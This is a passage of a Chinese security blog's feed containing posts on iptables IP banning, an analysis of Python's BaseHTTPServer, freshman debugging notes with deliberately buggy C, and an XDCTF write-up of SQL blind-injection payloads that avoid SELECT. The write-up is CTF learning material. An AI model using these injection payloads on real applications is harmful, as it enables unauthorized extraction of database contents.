<h3 id="ban_ip小记">ban ip小记</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">要封停一个IP，使用下面这条命令：</span><br><span class="line">    iptables -I INPUT -s <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> -j DROP</span><br><span class="line">要解封一个IP，使用下面这条命令：</span><br><span class="line">    iptables -D INPUT -s <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> -j DROP</span><br></pre></td></tr></table></figure>
<hr>
<p><a href="https://github.com/Hcamael/Blackeatblack" target="_blank" rel="external">源码</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png" alt="HCTF"></p>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python 的 BaseHTTPServer模块分析小结]]></title>
    <link href="http://0x48.pw/2015/12/01/0x0C/"/>
    <id>http://0x48.pw/2015/12/01/0x0C/</id>
    <published>2015-12-01T05:02:30.000Z</published>
    <updated>2016-03-28T10:21:45.646Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>已经好久没更新过博客了，因为最近开始用为知笔记了，感觉每次发到blog的都太零散了，好多都还没完成，所以现在决定，零散的写到笔记里去，然后有一个完整的内容再发到blog里来。</p>
</blockquote>
<a id="more"></a>
<p>这次是一篇完整的BaseHTTPServer模块分析，花了几天时间研究该模块，先放上我的思维导图，由于是第一次使用思维导图，所以弄得不是很满意。<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-BaseHTTPServer.jpeg" alt="BaseHTTPServer"></p>
<p>分析该模块的起因是该反代程序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> BaseHTTPServer</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheHandler</span><span class="params">(BaseHTTPServer.BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">      m = hashlib.md5()</span><br><span class="line">      m.update(self.path)</span><br><span class="line">      cache_filename = m.hexdigest()</span><br><span class="line">      <span class="keyword">if</span> os.path.exists(cache_filename):</span><br><span class="line">          <span class="keyword">print</span> <span class="string">"Cache hit"</span></span><br><span class="line">          data = open(cache_filename).readlines()</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">print</span> <span class="string">"Cache miss"</span></span><br><span class="line">          data = urllib2.urlopen(<span class="string">"http://www.baidu.com"</span> + self.path).readlines()</span><br><span class="line">          open(cache_filename, <span class="string">'wb'</span>).writelines(data)</span><br><span class="line">      self.send_response(<span class="number">200</span>)</span><br><span class="line">      self.end_headers()</span><br><span class="line">      self.wfile.writelines(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    server_address = (<span class="string">''</span>, <span class="number">9999</span>)</span><br><span class="line">    httpd = BaseHTTPServer.HTTPServer(server_address, CacheHandler)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure></p>
<h1 id="BaseHTTPServer">BaseHTTPServer</h1><p>在该模块中定义了两个类</p>
<ul>
<li>HTTPServer</li>
<li>BaseHTTPRequestHandler</li>
</ul>
<h2 id="HTTPServer(SocketServer-TCPServer)">HTTPServer(SocketServer.TCPServer)</h2><p>该类中为定义 <strong>init</strong>()初始化函数，所以跳到它继承的 <code>SocketServer.TCPServer</code>中去</p>
<h3 id="TCPServer(BaseServer)">TCPServer(BaseServer)</h3><p><em>_init</em>_ 接收两个必填参数，和一个可选参数。<br>前两个参数到他继承的BaseServer中初始化<br>这两个参数一个是需要监听的地址和端口， 一个是类<br>然后就是建立一个socket链接 <code>self.socket = socket.socket(self.address_family, self.socket_type)</code><br>然后是<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    self.<span class="function"><span class="title">server_bind</span><span class="params">()</span></span></span><br><span class="line">    self.<span class="function"><span class="title">server_activate</span><span class="params">()</span></span></span><br><span class="line">except:</span><br><span class="line">    self.<span class="function"><span class="title">server_close</span><span class="params">()</span></span></span><br><span class="line">    raise</span><br></pre></td></tr></table></figure></p>
<p>如果传了第三个参数，值为False，则不执行上面的代码<br>然后，初始化完毕</p>
<h4 id="server_bind(self)">server_bind(self)</h4><p>（这重名字就能猜到大概，所以说，编程是命名要有意义！）<br>根据前面初始化的地址，绑定地址端口。<br>也就是socket编程中的 <code>socket.bind()</code></p>
<h4 id="server_activate(self)">server_activate(self)</h4><p>写过socket服务的就知道了，绑定完后就是监听了.<br>默认是5个客户端.<br>socket.listen(5)</p>
<h4 id="get_request(self)">get_request(self)</h4><p>没啥好说的, 返回 socket.accept()</p>
<h4 id="BaseServer">BaseServer</h4><p><em>_init_</em> 接收两个参数，然后赋值给self.</p>
<h5 id="serve_forever(self,_poll_interval=0-5)">serve_forever(self, poll_interval=0.5)</h5><p>上面的反代程序中，初始化完后就是执行该方法，由于上面都没有定义过，所以就跑到这来执行了。<br>先是去执行 <code>select.select([self], [], [], 0.5)</code> (select还未研究透彻)<br>接着执行 <code>_handle_request_noblock()</code></p>
<h5 id="_handle_request_noblock(self)">_handle_request_noblock(self)</h5><p>先是执行 <code>get_request()</code>(该类里竟然没有该方法，在TCPServer里有)<br>接着把accept返回的两个值传给 <code>process_request</code> 方法</p>
<h5 id="process_request(self,_request,_client_address)">process_request(self, request, client_address)</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="function"><span class="title">finish_request</span><span class="params">(request, client_address)</span></span></span><br><span class="line">self.<span class="function"><span class="title">shutdown_request</span><span class="params">(request)</span></span></span><br></pre></td></tr></table></figure>
<h5 id="finish_request(self,_request,_client_address)">finish_request(self, request, client_address)</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="function"><span class="title">RequestHandlerClass</span><span class="params">(request, client_address, self)</span></span></span><br></pre></td></tr></table></figure>
<p>RequestHandlerClass 是初始化的时候传入的第二个类参数<br>所以HTTPServer类的主体部分基本结束了，接下来是运行传入的模块</p>
<h5 id="shutdown_request(self,_request)">shutdown_request(self, request)</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="function"><span class="title">close_request</span><span class="params">(request)</span></span></span><br></pre></td></tr></table></figure>
<h5 id="close_request(self,_request)">close_request(self, request)</h5><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<hr>
<p>上面反代的程序中，传入的是 CacheHandler类</p>
<h1 id="CacheHandler(BaseHTTPServer-BaseHTTPRequestHandler)">CacheHandler(BaseHTTPServer.BaseHTTPRequestHandler)</h1><p>没有 <em>_init</em>_ 所以看它继承的类</p>
<h2 id="BaseHTTPRequestHandler(SocketServer-StreamRequestHandler)">BaseHTTPRequestHandler(SocketServer.StreamRequestHandler)</h2><p>也没有<em>_init</em>_ 所以继续看它继承的类</p>
<h3 id="handle(self)">handle(self)</h3><p>执行 handle_one_request()<br>有一个参数 <code>close_connection = 1</code> 但为0的时候循环执行上面这个方法</p>
<h3 id="handle_one_request(self)">handle_one_request(self)</h3><p>该方法每执行一次，从文件中读取一行，接着超蛋疼！<br>因为它只读一行！本以为上面那个方法每次循环读一行，然后获取所有headers，但是实际上只获取<br><code>GET / HTTP/1.1</code><br>该类初始化赋值的时候，赋值了一个 <code>default_request_version = &quot;HTTP/0.9&quot;</code><br>但是却要该值 &gt;= HTTP/1.1 才把 <code>close_connection</code> 设置为0<br>接下来就是执行 <code>&#39;do_&#39; + method</code>, 啥意思？<br>比如上面的，<code>GET / HTTP/1.1</code> 代码会把这串字符串分成三部分，而GET就是method，所以说，如果是 <code>POST / HTTP/1.1</code>则是执行 <code>do_POST</code> 方法，但是由于该反代只写了 <code>do_GET</code> 所以只能接收GET方法</p>
<h3 id="StreamRequestHandler(BaseRequestHandler)">StreamRequestHandler(BaseRequestHandler)</h3><p>还是没有 <em>_init</em>_ 接着看下去</p>
<h4 id="setup(self)">setup(self)</h4><p>socket.accept() 返回的socket对象有个makefile方法，就是把收到的数据当成文件来读，返回的数据当文件来写，<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self<span class="class">.rfile</span> = self<span class="class">.connection</span><span class="class">.makefile</span>(<span class="string">'rb'</span>, self.rbufsize)</span><br><span class="line">self<span class="class">.wfile</span> = self<span class="class">.connection</span><span class="class">.makefile</span>(<span class="string">'wb'</span>, self.wbufsize)</span><br></pre></td></tr></table></figure></p>
<h4 id="finish(self)">finish(self)</h4><p>把上面打开的读写文件都关闭</p>
<h4 id="BaseRequestHandler">BaseRequestHandler</h4><p>接收三个值，初始化给self， 然后执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">handle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">finish</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
<p>这三个方法.</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>已经好久没更新过博客了，因为最近开始用为知笔记了，感觉每次发到blog的都太零散了，好多都还没完成，所以现在决定，零散的写到笔记里去，然后有一个完整的内容再发到blog里来。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Python" scheme="http://0x48.pw/tags/Python/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[10.31新生培训]]></title>
    <link href="http://0x48.pw/2015/10/31/0x0B/"/>
    <id>http://0x48.pw/2015/10/31/0x0B/</id>
    <published>2015-10-31T13:28:26.000Z</published>
    <updated>2016-03-28T10:21:57.638Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>10.31新生培训</p>
</blockquote>
<a id="more"></a>
<h2 id="代码的调试之旅_——_Debug">代码的调试之旅 —— Debug</h2><ol>
<li>VS2015<ul>
<li>F10 step out</li>
<li>F11 step into</li>
</ul>
</li>
<li>codeblocks<ul>
<li>shitf F7 step into</li>
<li>F7 step</li>
</ul>
</li>
<li>gdb<ul>
<li>next 执行下一行语句</li>
<li>step 同上，有函数则会进入函数</li>
<li>run 运行到断点处</li>
<li>breakpoint 下断点</li>
<li>start 停在main的第一行语句前</li>
<li>print 打印变量</li>
<li>display 跟踪一个变量</li>
<li>undisplay 取消跟踪</li>
<li>info locals 查看局部变量</li>
<li>list 列出最近十行代码</li>
</ul>
</li>
</ol>
<h2 id="BUG">BUG</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// error1.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span>&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">index</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Hello World!"</span>)；</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//error2.c</span></span><br><span class="line"><span class="preprocessor">#include&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a;</span><br><span class="line">	<span class="keyword">char</span> b[<span class="number">2</span>] = <span class="string">'ab'</span>;</span><br><span class="line"></span><br><span class="line">	a = <span class="string">"c"</span>;</span><br><span class="line"></span><br><span class="line">	printf(<span class="string">"b = %s and a = %c\n"</span>, b, a);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//error_last.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> yue</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="keyword">struct</span> yue *next;</span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> yue *creat(<span class="keyword">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> yue *head, *pold, *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	p = head = pold;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i&lt;a; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p = (<span class="keyword">struct</span> yue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> yue));</span><br><span class="line">		p-&gt;num = i;</span><br><span class="line">		pold-&gt;next = p;</span><br><span class="line">		pold = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	p-&gt;num = a;</span><br><span class="line">	p-&gt;next = head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">struct</span> yue *p1, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	node *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">	p = p1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (n = <span class="number">1</span>; n&lt; b - <span class="number">1</span>; n++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%5d"</span>, p-&gt;num);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	node *p2;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input x:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line"></span><br><span class="line">	p2 = creat(x);</span><br><span class="line">	print(p2, x);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="知识积淀_——_博客_OR_笔记">知识积淀 —— 博客 OR 笔记</h2><h3 id="For_yourself">For yourself</h3><pre><code>-<span class="ruby"> 作为知识的积淀，记录了你的成长
</span>-<span class="ruby"> 你确定你真的掌握了吗？如果你能把该知识点用文字描述出来，那么你就算是真的掌握了
</span>-<span class="ruby"> 备忘</span>
</code></pre><h3 id="For_others">For others</h3><pre><code>-<span class="ruby"> 知识分享
</span>-<span class="ruby"> 交友
</span>-<span class="ruby"> 面试时加分</span>
</code></pre><h3 id="How_can_I_write?">How can I write?</h3><pre><code>就想写日记一样， 多写，多看就知道怎么写了
</code></pre><h3 id="第三方博客">第三方博客</h3><pre><code>-<span class="ruby"> <span class="symbol">http:</span>/<span class="regexp">/www.diandian.com/</span>
</span>-<span class="ruby"> <span class="symbol">http:</span>/<span class="regexp">/blog.csdn.net/</span>
</span>-<span class="ruby"> 百度、新浪 等等</span>
</code></pre><p><em>PS: 可以从我博客的友情链接中发现协会其他人的博客</em></p>
<h2 id="推荐文章">推荐文章</h2><ol>
<li>前言: <a href="http://zhuanlan.zhihu.com/Evi1m0/19695848" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19695848</a></li>
<li>因为所以 <a href="http://zhuanlan.zhihu.com/Evi1m0/19700177" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19700177</a></li>
<li>黑客眼中的黑客 <a href="http://zhuanlan.zhihu.com/Evi1m0/19702939" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19702939</a></li>
<li>学会使用搜索引擎 <a href="http://zhuanlan.zhihu.com/Evi1m0/19714051" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19714051</a></li>
<li>首先，你需要先学会编程 <a href="http://zhuanlan.zhihu.com/Evi1m0/19733294" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19733294</a></li>
<li>你们眼中的黑客 —— 脚本小子 <a href="http://zhuanlan.zhihu.com/Evi1m0/19773598" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19773598</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>10.31新生培训</p>
</blockquote>]]>
    
    </summary>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[不使用select情况下的各种盲注]]></title>
    <link href="http://0x48.pw/2015/10/05/0x09/"/>
    <id>http://0x48.pw/2015/10/05/0x09/</id>
    <published>2015-10-05T03:17:10.000Z</published>
    <updated>2016-03-28T10:22:39.150Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
</blockquote>
<a id="more"></a>
<p>原本我以为, 在select被过滤的情况下, 如果不能bypass, 就没法注入… 而这次看了writeup后, 不同的队, 姿势都不同, 大开眼界….</p>
<p>这次题目的语句我猜测是 <code>select pic from table where ID=&quot;$i&quot;;</code><br>$i 则是可控点..</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload 0x0:</span><br><span class="line">    $i = 1" &amp;&amp; username="%</span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> talbe <span class="keyword">where</span> ID=<span class="string">"1"</span> &amp;&amp; username=<span class="string">"%"</span></span><br><span class="line">这个payload可以用来猜测是否有该字段, 接下来的盲注这语句仍然可用</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x1</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR if(rpad(username,1,1)="</span>a<span class="string">",1,0)#  或者 111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">101</span>),<span class="number">1</span>,<span class="number">0</span>)# </span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">"a"</span>,<span class="number">1</span>,<span class="number">0</span>)#<span class="string">"</span><br><span class="line">在知道该表有username字段后, 可以通过这语句进行盲注</span></span></span><br></pre></td></tr></table></figure>
<p>上面的语句用到了两个函数, 一个 <code>if()</code> &amp;&amp; <code>rpad()</code><br>if函数在我之前的博客中写过, 就不再多说..主要讲讲rpad()<br>rpad还有个相同功能的行数lpad, 一个是right 一个是 left , 具体的用法已实例来讲解:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql&gt; select name from table;</span><br><span class="line">+----------+</span></span><br><span class="line"><span class="header">| name     |</span><br><span class="line">+----------+</span></span><br><span class="line"><span class="header">| Hcamael  |</span><br><span class="line">+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="header">mysql&gt; select rpad(name,5,1) from table;</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| rpad(name,5,1)     |</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| Hcama              |</span><br><span class="line">+--------------------+</span></span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="header">mysql&gt; select rpad(name,10,1) from table;</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| rpad(name,10,1)     |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| Hcamael111          |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="header">mysql&gt; select lpad(name,5,1) from table;</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| rpad(name,5,1)     |</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| Hcama              |</span><br><span class="line">+--------------------+</span></span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="header">mysql&gt; select lpad(name,10,1) from table;</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| lpad(name,10,1)     |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| 111Hcamael          |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>这两个函数有三个参数, 第一个是字段名, 第二个是显示几位, 第三个是当位数不足时, 以啥补充..</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload 0x2:</span><br><span class="line">    $i = 111" OR username REGEXP "^[a-z]</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID =<span class="string">"111"</span> <span class="keyword">OR</span> username <span class="keyword">REGEXP</span> <span class="string">"^[a-z]"</span></span><br><span class="line">正则匹配法注入, 真是涨姿势了, 第一次见</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x3</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR (ascii(ord(username,1,1)))=97# 或者 111"</span> <span class="keyword">OR</span> (<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>))=<span class="string">'a'</span>#</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> (<span class="keyword">ascii</span>(<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">97</span>#<span class="string">"</span><br><span class="line">这种方法我以前盲注的时候写过, 可是当没有select的时候, 我却自然的以为这些不行用了...</span></span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
</blockquote>]]>
    
    </summary>
    
      <category term="SQLi" scheme="http://0x48.pw/tags/SQLi/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[2015XDCTF低分web题writeup]]></title>
    <link href="http://0x48.pw/2015/10/03/0x08/"/>
    <id>http://0x48.pw/2015/10/03/0x08/</id>
    <published>2015-10-03T06:11:30.000Z</published>
    <updated>2016-03-28T10:23:12.270Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-xdctf.png" alt="xdctf"></p>
<a id="more"></a>
<p>国庆两天, XDCTF, 质量和难度和上次的NSCTF都不是一个层次的…</p>
